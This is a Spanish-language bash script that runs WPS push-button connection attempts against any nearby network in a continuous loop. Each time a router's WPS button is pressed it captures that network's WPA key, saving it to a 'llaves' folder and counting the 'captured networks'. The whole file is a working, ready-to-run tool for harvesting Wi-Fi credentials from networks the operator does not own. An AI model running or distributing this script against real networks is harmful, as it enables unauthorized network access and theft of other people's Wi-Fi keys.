#!/bin/bash
#by chewwe y Tux0
######### 
# Gran parte del codigo que 
# se usa aqui es del scrit de kcdtv llamado PBC.sh. 
# Un script para conectarte mediante 
# pbc por consola en sistemas linux
#  https://github.com/kcdtv/PBC
#########
source /root/scripts/sistema/colores
source /root/scripts/pbc-bucle/pbc-bucle.conf
sesion=0
echo $sesion >/tmp/sesion
trap 'stop' INT
function stop (){
clear
echo
echo " limpiando..."
systemctl stop network-manager 2>/dev/null
killall wpa_supplicant dhclient 2>/dev/null
rfkill unblock wifi
rm /var/run/wpa_supplicant/${iface} 2>/dev/null
ip link set "$iface" down
iwconfig "$iface" mode managed
ip link set "$iface" up
echo " Listo, todo limpio. bye!"
echo
exit
}
function oler {
rm  /tmp/PBC.conf >/dev/null
systemctl stop network-manager 2>/dev/null
killall wpa_supplicant dhclient 2>/dev/null
rfkill unblock wifi
rm /var/run/wpa_supplicant/${iface} 2>/dev/null
ip link set "$iface" down
iwconfig "$iface" mode managed
ip link set "$iface" up
echo "ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=root
update_config=1" >> /tmp/PBC.conf
wpa_supplicant -c /tmp/PBC.conf -i "$iface" -B 
if [ $? != 0 ]; then
	sleep 3
	oler
fi
wpa_cli -i "$iface" wps_pbc any
krono=120
    while [ $krono -gt 0 ]; 
      do
        krono=$((krono - 1))
	clear
	echo;echo
	echo "${AMARILLO} PBC-bucle${NORMAL}"
	echo;echo
        echo -ne " Cuenta atras a reinicio sniffer  ${VIOLETA} $krono ${NORMAL}"
	echo;echo
	echo " ${VERDE}$(ls /root/scripts/pbc-bucle/llaves/ | wc -l)${NORMAL} redes capturadas en total"
	echo " ${VERDE}$sesion ${NORMAL}redes capturadas en esta sesion. "
	echo
	echo "          Todas las llaves WPA se guardan en ${VIOLETA}/root/scripts/pbc-bucle/llaves${NORMAL}"
	echo
            if ( grep -q "network=" /tmp/PBC.conf ) ;
              then
		DATE=`date +%Y-%m-%d-%H-%M-%S`
		cp /tmp/PBC.conf  /root/scripts/pbc-bucle/llaves/${DATE}_llave.txt
		echo;echo
		sesion=$((sesion + 1))
		echo $sesion > /tmp/sesion
		echo -e " Red capturada!  ${VERDE}$(grep ssid /tmp/PBC.conf)${NORMAL} "
		sleep 4
		oler
	fi
	sleep 1
    done
sleep 2
oler
}
oler
